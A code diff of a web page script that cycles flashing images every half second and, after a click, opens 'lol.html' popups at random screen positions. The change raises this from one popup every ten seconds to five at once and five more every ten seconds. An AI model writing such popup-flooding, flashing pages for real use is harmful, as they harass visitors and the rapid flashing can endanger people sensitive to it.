@@ -65,13 +65,13 @@
     let index = 0;
     let started = false;
 
-    // Flashing images
+    // Flashing images (unchanged)
     setInterval(() => {
       index = (index + 1) % images.length;
       image.src = images[index];
     }, 500);
 
-    // Mute
+    // Mute toggle
     muteBtn.addEventListener("click", (e) => {
       e.stopPropagation();
       audio.muted = !audio.muted;
@@ -85,14 +85,19 @@
         const w = 308;
         const h = 308;
 
-        function openPopup() {
-          const left = Math.floor(Math.random() * (screen.width - w));
-          const top = Math.floor(Math.random() * (screen.height - h));
-          window.open("lol.html", "", `width=${w},height=${h},left=${left},top=${top}`);
+        function openBatch() {
+          for (let i = 0; i < 5; i++) {
+            const left = Math.floor(Math.random() * (screen.width - w));
+            const top = Math.floor(Math.random() * (screen.height - h));
+            window.open("lol.html", "", `width=${w},height=${h},left=${left},top=${top}`);
+          }
         }
 
-        openPopup();               // first immediately
-        setInterval(openPopup, 10000); // then every 10s
+        openBatch(); //  first 5 instantly
+
+        setInterval(() => {
+          openBatch(); //  5 more every 10s
+        }, 10000);
       }
     });
   </script>
